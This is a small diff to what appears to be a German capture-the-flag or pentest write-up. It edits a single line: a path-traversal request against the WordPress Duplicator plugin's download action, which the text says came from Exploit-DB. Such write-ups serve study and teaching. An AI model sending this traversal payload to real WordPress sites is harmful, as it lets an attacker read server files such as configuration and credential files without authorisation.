@@ -59,7 +59,7 @@ Die Version war veraltet und hatte eine bekannte Schwachstelle.
 In Exploit-DB habe ich folgenden Exploit gefunden:
 
 ```bash
-/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../..
+/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../.
 ```
 
 Ich habe den Exploit so gebaut:
